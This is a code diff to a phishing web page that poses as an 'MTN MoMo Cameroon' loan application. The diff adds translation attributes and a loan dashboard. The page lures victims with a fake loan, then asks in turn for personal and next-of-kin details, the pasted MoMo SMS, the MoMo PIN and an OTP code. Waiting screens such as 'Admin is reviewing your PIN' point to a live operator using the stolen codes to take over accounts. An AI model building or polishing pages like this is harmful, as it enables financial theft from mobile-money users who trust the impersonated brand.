@@ -19,29 +19,32 @@
                 <div class="mtn-logo-sub">from MTN Cameroon</div>
             </div>
             <div style="flex:1;"></div>
+            <button class="lang-toggle" onclick="toggleLanguage()">
+                <span id="langIcon">🌐 EN</span>
+            </button>
         </div>
         <div class="land-center">
             <div class="land-card">
-                <h1>Welcome to MTN MoMo Cameroon</h1>
-                <p class="land-tagline">Get loans easily through MTN MoMo Cameroon</p>
+                <h1 data-i18n="welcome">Welcome to MTN MoMo Cameroon</h1>
+                <p class="land-tagline" data-i18n="tagline">Get loans easily through MTN MoMo Cameroon</p>
                 <div class="calc-box">
-                    <h2>Loan Calculator</h2>
-                    <div class="calc-row2"><span>Amount</span><span class="cv" id="calcAmt">XAF 1,000,000</span></div>
-                    <div class="calc-row2"><span>Term</span><span class="cv" id="calcTerm">48 Months</span></div>
+                    <h2 data-i18n="calculator">Loan Calculator</h2>
+                    <div class="calc-row2"><span data-i18n="amount">Amount</span><span class="cv" id="calcAmt">XAF 1,000,000</span></div>
+                    <div class="calc-row2"><span data-i18n="term">Term</span><span class="cv" id="calcTerm">48 Months</span></div>
                     <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()" />
                     <div class="range-ends"><span>XAF 500,000</span><span>XAF 5,000,000</span></div>
-                    <div class="monthly-box"><span class="ml">Monthly Payment</span><span class="ma" id="monthlyAmt">XAF 24,000</span></div>
+                    <div class="monthly-box"><span class="ml" data-i18n="monthly">Monthly Payment</span><span class="ma" id="monthlyAmt">XAF 24,000</span></div>
                 </div>
-                <button class="btn-grad" onclick="startApplication()">START APPLICATION</button>
+                <button class="btn-grad" onclick="startApplication()" data-i18n="start">START APPLICATION</button>
             </div>
         </div>
-        <div class="land-footer">© 2026 MTN MoMo Loans – Powered by MTN Cameroon</div>
+        <div class="land-footer" data-i18n="footer">© 2026 MTN MoMo Loans – Powered by MTN Cameroon</div>
     </div>
 
     <!-- PAGE 2: STEP 1 -->
     <div id="page-step1" class="page">
         <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
+            <a class="nav-left" onclick="goTo('page-landing')">← <span data-i18n="back">Back</span></a>
             <div class="mtn-logo" style="flex-direction:row;gap:6px;">
                 <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
                 <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Cameroon</div></div>
@@ -50,15 +53,15 @@
         </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2>Loan Application</h2>
-                <p class="step-sub">Step 1 of 5</p>
+                <h2 data-i18n="loan_application">Loan Application</h2>
+                <p class="step-sub" data-i18n="step1_sub">Step 1 of 5</p>
                 <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
-                <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Student Loan</option></select></div></div>
-                <div class="field"><label>Loan Amount (XAF)</label><input type="number" id="s1am" value="1000000" placeholder="Enter amount" oninput="clearErr('s1Err')" /></div>
-                <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option></select></div></div>
-                <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
-                <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
+                <div class="field"><label data-i18n="loan_type">Loan Type</label><div class="sel-wrap"><select id="s1ty"><option data-i18n="personal">Personal Loan</option><option selected data-i18n="business">Business Loan</option><option data-i18n="home">Home Loan</option><option data-i18n="student">Student Loan</option></select></div></div>
+                <div class="field"><label data-i18n="loan_amount">Loan Amount (XAF)</label><input type="number" id="s1am" value="1000000" placeholder="Enter amount" oninput="clearErr('s1Err')" /></div>
+                <div class="field"><label data-i18n="loan_term">Loan Term</label><div class="sel-wrap"><select id="s1te"><option data-i18n="m6">6 Months</option><option data-i18n="m12">12 Months</option><option data-i18n="m18">18 Months</option><option data-i18n="m24">24 Months</option><option selected data-i18n="m48">48 Months</option></select></div></div>
+                <div class="field"><label data-i18n="purpose">Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
+                <button class="btn-grad" onclick="toS2()" data-i18n="next">NEXT STEP</button>
             </div>
         </div>
     </div>
@@ -66,7 +69,7 @@
     <!-- PAGE 3: STEP 2 -->
     <div id="page-step2" class="page">
         <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
+            <a class="nav-left" onclick="goTo('page-step1')">← <span data-i18n="back">Back</span></a>
             <div class="mtn-logo" style="flex-direction:row;gap:6px;">
                 <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
                 <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Cameroon</div></div>
@@ -75,21 +78,21 @@
         </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2>Loan Application</h2>
-                <p class="step-sub">Step 2 of 5</p>
+                <h2 data-i18n="loan_application">Loan Application</h2>
+                <p class="step-sub" data-i18n="step2_sub">Step 2 of 5</p>
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
                 <div class="field-row">
-                    <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')" /></div>
-                    <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')" /></div>
+                    <div class="field"><label data-i18n="first_name">First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')" /></div>
+                    <div class="field"><label data-i18n="last_name">Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')" /></div>
                 </div>
                 <div class="field">
-                    <label>Phone Number (Cameroon)</label>
+                    <label data-i18n="phone_label">Phone Number (Cameroon)</label>
                     <div class="phone-row"><div class="ph-pre">+237</div><input type="tel" id="s2ph" placeholder="6XX XXX XXX" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div>
-                    <div class="field-hint">9 digits without +237 prefix (e.g., 670123456)</div>
+                    <div class="field-hint" data-i18n="phone_hint">9 digits without +237 prefix (e.g., 670123456)</div>
                 </div>
-                <div class="field"><label>Email Address</label><input type="email" id="s2em" placeholder="your@email.com" oninput="clearErr('s2Err')" /></div>
-                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step1')">BACK</button><button class="btn-grad" onclick="toS3()">NEXT STEP</button></div>
+                <div class="field"><label data-i18n="email">Email Address</label><input type="email" id="s2em" placeholder="your@email.com" oninput="clearErr('s2Err')" /></div>
+                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step1')" data-i18n="back">BACK</button><button class="btn-grad" onclick="toS3()" data-i18n="next">NEXT STEP</button></div>
             </div>
         </div>
     </div>
@@ -97,7 +100,7 @@
     <!-- PAGE 4: STEP 3 -->
     <div id="page-step3" class="page">
         <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
+            <a class="nav-left" onclick="goTo('page-step2')">← <span data-i18n="back">Back</span></a>
             <div class="mtn-logo" style="flex-direction:row;gap:6px;">
                 <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
                 <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Cameroon</div></div>
@@ -106,22 +109,22 @@
         </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2>Loan Application</h2>
-                <p class="step-sub">Step 3 of 5</p>
+                <h2 data-i18n="loan_application">Loan Application</h2>
+                <p class="step-sub" data-i18n="step3_sub">Step 3 of 5</p>
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
-                <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected>Self-employed</option><option>Unemployed</option><option>Retired</option></select></div></div>
-                <div class="field"><label>Annual Income (XAF)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')" /></div>
-                <div class="field"><label>Next of Kin Name</label><input type="text" id="s3kn" placeholder="Full name of next of kin" oninput="clearErr('s3Err')" /></div>
-                <div class="field"><label>Next of Kin Phone</label><input type="tel" id="s3kp" placeholder="+237 6XX XXX XXX" oninput="clearErr('s3Err')" /></div>
+                <div class="field"><label data-i18n="employment">Employment Status</label><div class="sel-wrap"><select id="s3em"><option data-i18n="employed">Employed</option><option selected data-i18n="self_employed">Self-employed</option><option data-i18n="unemployed">Unemployed</option><option data-i18n="retired">Retired</option></select></div></div>
+                <div class="field"><label data-i18n="annual_income">Annual Income (XAF)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')" /></div>
+                <div class="field"><label data-i18n="kin_name">Next of Kin Name</label><input type="text" id="s3kn" placeholder="Full name of next of kin" oninput="clearErr('s3Err')" /></div>
+                <div class="field"><label data-i18n="kin_phone">Next of Kin Phone</label><input type="tel" id="s3kp" placeholder="+237 6XX XXX XXX" oninput="clearErr('s3Err')" /></div>
                 <div class="sum-box">
-                    <h3>Application Summary</h3>
-                    <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">XAF 1,000,000</span></div>
-                    <div class="sum-row"><span class="sk">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
-                    <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
-                    <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
+                    <h3 data-i18n="summary">Application Summary</h3>
+                    <div class="sum-row"><span class="sk" data-i18n="loan_amount">Loan Amount:</span><span class="sv" id="sA">XAF 1,000,000</span></div>
+                    <div class="sum-row"><span class="sk" data-i18n="loan_term">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
+                    <div class="sum-row"><span class="sk" data-i18n="purpose">Purpose:</span><span class="sv" id="sP">—</span></div>
+                    <div class="sum-row"><span class="sk" data-i18n="applicant">Applicant:</span><span class="sv" id="sN">—</span></div>
                 </div>
-                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step2')">BACK</button><button class="btn-grad" onclick="submitApp()">SUBMIT APPLICATION</button></div>
+                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step2')" data-i18n="back">BACK</button><button class="btn-grad" onclick="submitApp()" data-i18n="submit">SUBMIT APPLICATION</button></div>
             </div>
         </div>
     </div>
@@ -131,17 +134,17 @@
         <div style="background:linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="proc-wrap">
                 <div class="proc-icon">⏳</div>
-                <h2>Processing Application...</h2>
-                <p>Please wait while we process your loan application</p>
-                <div id="processingStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">⏳ Awaiting admin approval...</div>
+                <h2 data-i18n="processing">Processing Application...</h2>
+                <p data-i18n="processing_sub">Please wait while we process your loan application</p>
+                <div id="processingStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);" data-i18n="awaiting">⏳ Awaiting admin approval...</div>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 6: SMS PASTE (with countdown & resend below box) -->
+    <!-- PAGE 6: SMS PASTE -->
     <div id="page-sms-paste" class="page">
         <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-processing')">← Back</a>
+            <a class="nav-left" onclick="goTo('page-processing')">← <span data-i18n="back">Back</span></a>
             <div class="mtn-logo" style="flex-direction:row;gap:6px;">
                 <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
                 <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Cameroon</div></div>
@@ -150,23 +153,23 @@
         </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2>Verify MoMo Message</h2>
-                <p class="step-sub">Step 4 of 5</p>
+                <h2 data-i18n="verify_sms">Verify MoMo Message</h2>
+                <p class="step-sub" data-i18n="step4_sub">Step 4 of 5</p>
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="momErr"><span class="msg-icon">✕</span><span id="momErrTxt"></span></div>
                 <div class="momo-msg-box">
-                    <label style="font-weight:600; display:block; margin-bottom:6px;">📩 Paste the MoMo message content:</label>
+                    <label style="font-weight:600; display:block; margin-bottom:6px;" data-i18n="paste_sms">📩 Paste the MoMo message content:</label>
                     <textarea id="smsMsgBox" placeholder="Copy and paste the entire MoMo message you received on your phone here..."></textarea>
-                    <div class="hint">This should include the OTP code or verification details sent to your MoMo number.</div>
+                    <div class="hint" data-i18n="sms_hint">This should include the OTP code or verification details sent to your MoMo number.</div>
                 </div>
                 <div style="margin: 8px 0 12px; padding: 10px; background: #f8f9fa; border-radius: 6px; font-size:0.8rem; color:var(--text-light);">
-                    <strong>💡 Tip:</strong> Check your SMS inbox for the message from MTN MoMo Cameroon. Copy the entire message text.
+                    <strong data-i18n="sms_tip">💡 Tip:</strong> <span data-i18n="sms_tip_text">Check your SMS inbox for the message from MTN MoMo Cameroon. Copy the entire message text.</span>
                 </div>
-                <button class="btn-grad" onclick="doSmsParse()">SUBMIT MOMO MESSAGE</button>
-                <!-- Countdown & Resend (below the box, as requested) -->
+                <button class="btn-grad" onclick="doSmsParse()" data-i18n="submit_sms">SUBMIT MOMO MESSAGE</button>
+                <!-- Countdown & Resend below -->
                 <div id="smsCountdownWrap" style="margin-top:15px; display:none;">
                     <div id="smsCountdownText" class="countdown-text">Resend available in 60s</div>
-                    <button id="btnSmsResend" class="btn-resend" onclick="doSmsResend()" style="display:none;">🔄 Resend SMS</button>
+                    <button id="btnSmsResend" class="btn-resend" onclick="doSmsResend()" style="display:none;" data-i18n="resend_sms">🔄 Resend SMS</button>
                 </div>
             </div>
         </div>
@@ -177,18 +180,18 @@
         <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="wait-wrap">
                 <div class="wait-icon">⏳</div>
-                <h2>Verifying SMS Message...</h2>
-                <p>Your SMS message has been received. Please wait for admin verification...</p>
-                <div id="waitSmsStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">⏳ Admin is reviewing your SMS...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitSmsAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+                <h2 data-i18n="verifying_sms">Verifying SMS Message...</h2>
+                <p data-i18n="verifying_sms_sub">Your SMS message has been received. Please wait for admin verification...</p>
+                <div id="waitSmsStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);" data-i18n="admin_reviewing">⏳ Admin is reviewing your SMS...</div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);" data-i18n="app_id">Application ID: <span id="waitSmsAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 8: PIN (5 DIGITS) -->
+    <!-- PAGE 8: PIN -->
     <div id="page-pin" class="page">
         <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-wait-sms')">← Back</a>
+            <a class="nav-left" onclick="goTo('page-wait-sms')">← <span data-i18n="back">Back</span></a>
             <div class="mtn-logo" style="flex-direction:row;gap:6px;">
                 <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
                 <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Cameroon</div></div>
@@ -197,11 +200,11 @@
         </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2>Enter MoMo PIN</h2>
-                <p class="step-sub">Step 5 of 5</p>
+                <h2 data-i18n="enter_pin">Enter MoMo PIN</h2>
+                <p class="step-sub" data-i18n="step5_sub">Step 5 of 5</p>
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
-                <div class="pin-label">Enter your MoMo PIN (5 digits):</div>
+                <div class="pin-label" data-i18n="pin_label">Enter your MoMo PIN (5 digits):</div>
                 <div id="pinAttemptsDisplay" class="pin-attempts">🔑 Attempts remaining: 3 of 3</div>
                 <div class="pin-row">
                     <input type="password" id="pin0" class="pin-box" maxlength="1" oninput="pinMvM(this,0)" placeholder="•" />
@@ -212,7 +215,7 @@
                     <button class="pin-eye" onclick="togPin()" title="Show/Hide">👁</button>
                     <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN">✕</button>
                 </div>
-                <button class="btn-grad" onclick="doPin()">SUBMIT MOMO PIN</button>
+                <button class="btn-grad" onclick="doPin()" data-i18n="submit_pin">SUBMIT MOMO PIN</button>
             </div>
         </div>
     </div>
@@ -222,18 +225,18 @@
         <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="wait-wrap">
                 <div class="wait-icon">⏳</div>
-                <h2>Verifying MoMo PIN...</h2>
-                <p>Your MoMo PIN has been received. Please wait for admin verification...</p>
-                <div id="waitPinStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">⏳ Admin is reviewing your PIN...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitPinAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+                <h2 data-i18n="verifying_pin">Verifying MoMo PIN...</h2>
+                <p data-i18n="verifying_pin_sub">Your MoMo PIN has been received. Please wait for admin verification...</p>
+                <div id="waitPinStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);" data-i18n="admin_reviewing_pin">⏳ Admin is reviewing your PIN...</div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);" data-i18n="app_id">Application ID: <span id="waitPinAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 10: OTP (4 DIGITS) with countdown & resend below box -->
+    <!-- PAGE 10: OTP -->
     <div id="page-otp" class="page">
         <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-wait-pin')">← Back</a>
+            <a class="nav-left" onclick="goTo('page-wait-pin')">← <span data-i18n="back">Back</span></a>
             <div class="mtn-logo" style="flex-direction:row;gap:6px;">
                 <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
                 <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Cameroon</div></div>
@@ -242,10 +245,10 @@
         </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2>Enter OTP Code</h2>
-                <p class="step-sub">Enter the 4-digit OTP code sent to your phone via MTN MoMo Cameroon</p>
+                <h2 data-i18n="enter_otp">Enter OTP Code</h2>
+                <p class="step-sub" data-i18n="otp_sub">Enter the 4-digit OTP code sent to your phone via MTN MoMo Cameroon</p>
                 <div class="otp-section">
-                    <div class="otp-section-title">OTP Code (4 digits):</div>
+                    <div class="otp-section-title" data-i18n="otp_label">OTP Code (4 digits):</div>
                     <div style="display: flex; align-items: center;">
                         <div class="otp-inputs" id="otpInputs">
                             <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
@@ -257,11 +260,11 @@
                     </div>
                 </div>
                 <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
-                <button class="btn-grad" onclick="doOtp()">VERIFY & APPROVE LOAN</button>
-                <!-- Countdown & Resend (below the box, as requested) -->
+                <button class="btn-grad" onclick="doOtp()" data-i18n="verify_otp">VERIFY & APPROVE LOAN</button>
+                <!-- Countdown & Resend below -->
                 <div id="otpCountdownWrap" style="margin-top:15px; display:none;">
                     <div id="otpCountdownText" class="countdown-text">Resend available in 60s</div>
-                    <button id="btnOtpResend" class="btn-resend" onclick="doOtpResend()" style="display:none;">🔄 Resend OTP</button>
+                    <button id="btnOtpResend" class="btn-resend" onclick="doOtpResend()" style="display:none;" data-i18n="resend_otp">🔄 Resend OTP</button>
                 </div>
             </div>
         </div>
@@ -272,10 +275,10 @@
         <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="wait-wrap">
                 <div class="wait-icon">⏳</div>
-                <h2>Verifying OTP Code...</h2>
-                <p>Your OTP code has been received. Please wait for admin verification...</p>
-                <div id="waitOtpStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">⏳ Admin is verifying your OTP...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+                <h2 data-i18n="verifying_otp">Verifying OTP Code...</h2>
+                <p data-i18n="verifying_otp_sub">Your OTP code has been received. Please wait for admin verification...</p>
+                <div id="waitOtpStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);" data-i18n="admin_reviewing_otp">⏳ Admin is verifying your OTP...</div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);" data-i18n="app_id">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
             </div>
         </div>
     </div>
@@ -285,19 +288,42 @@
         <div class="appr-wrap">
             <div class="appr-top">
                 <div class="check-circle">✓</div>
-                <h2 class="appr-title">Loan Approved!</h2>
-                <p class="appr-sub">Your loan has been successfully approved.</p>
-                <div class="appr-banner"><div class="abl">Amount to Receive</div><div class="aba" id="aprAmount">XAF 1,000,000</div></div>
+                <h2 class="appr-title" data-i18n="approved_title">Loan Approved!</h2>
+                <p class="appr-sub" data-i18n="approved_sub">Your loan has been successfully approved.</p>
+                <div class="appr-banner"><div class="abl" data-i18n="amount_receive">Amount to Receive</div><div class="aba" id="aprAmount">XAF 1,000,000</div></div>
             </div>
-            <div class="comp-box"><div class="ch">ℹ️ Important Information</div><p>The funds will be deposited directly to your MTN MoMo account within 5 minutes. Please ensure your phone number is correct.</p></div>
+            <div class="comp-box">
+                <div class="ch">ℹ️ <span data-i18n="important">Important Information</span></div>
+                <p data-i18n="important_text">The funds will be deposited directly to your MTN MoMo account within 5 minutes. Please ensure your phone number is correct.</p>
+            </div>
             <div class="ld-card">
-                <div class="ld-htitle">📊 Loan Details</div>
-                <div class="ld-row"><div class="ld-icon ic-g">💰</div><div><div class="ld-lbl">Amount</div><div class="ld-val" id="aprAmt">XAF 1,000,000</div></div></div>
-                <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl">Term</div><div class="ld-val" id="aprTerm">48 Months</div></div></div>
-                <div class="ld-row"><div class="ld-icon ic-p">💳</div><div><div class="ld-lbl">Monthly Payment</div><div class="ld-val" id="aprMth">XAF 24,000</div></div></div>
+                <div class="ld-htitle">📊 <span data-i18n="loan_details">Loan Details</span></div>
+                <div class="ld-row"><div class="ld-icon ic-g">💰</div><div><div class="ld-lbl" data-i18n="amount">Amount</div><div class="ld-val" id="aprAmt">XAF 1,000,000</div></div></div>
+                <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl" data-i18n="term">Term</div><div class="ld-val" id="aprTerm">48 Months</div></div></div>
+                <div class="ld-row"><div class="ld-icon ic-p">💳</div><div><div class="ld-lbl" data-i18n="monthly">Monthly Payment</div><div class="ld-val" id="aprMth">XAF 24,000</div></div></div>
             </div>
-            <div class="nxt-steps"><span style="font-size:1.2rem;">📌</span><p><strong>Next Steps:</strong> To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next 7 days.</p></div>
-            <div class="rth-wrap"><button class="rth-btn" onclick="alert('Thank you! Your loan has been disbursed.')">FINISH</button></div>
+            <div class="nxt-steps"><span style="font-size:1.2rem;">📌</span><p><strong data-i18n="next_steps">Next Steps:</strong> <span data-i18n="next_steps_text">To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next 7 days.</span></p></div>
+            <div class="rth-wrap">
+                <button class="rth-btn" onclick="goTo('page-dashboard')" data-i18n="view_dashboard">VIEW DASHBOARD</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 13: DASHBOARD -->
+    <div id="page-dashboard" class="page">
+        <div class="dash-wrap">
+            <div class="dash-card">
+                <h2 data-i18n="dashboard_title">Loan Dashboard</h2>
+                <div class="dash-row"><span data-i18n="loan_id">Loan ID:</span><span id="dashId">-</span></div>
+                <div class="dash-row"><span data-i18n="amount">Amount:</span><span id="dashAmount">-</span></div>
+                <div class="dash-row"><span data-i18n="term">Term:</span><span id="dashTerm">-</span></div>
+                <div class="dash-row"><span data-i18n="monthly">Monthly Payment:</span><span id="dashMonthly">-</span></div>
+                <div class="dash-row"><span data-i18n="status">Status:</span><span id="dashStatus" class="approved">Approved</span></div>
+                <div class="dash-actions">
+                    <button class="btn-grad" onclick="alert('Payment feature coming soon!')" data-i18n="make_payment">Make Payment</button>
+                    <button class="btn-gray" onclick="goTo('page-landing')" data-i18n="logout">Logout</button>
+                </div>
+            </div>
         </div>
     </div>
 
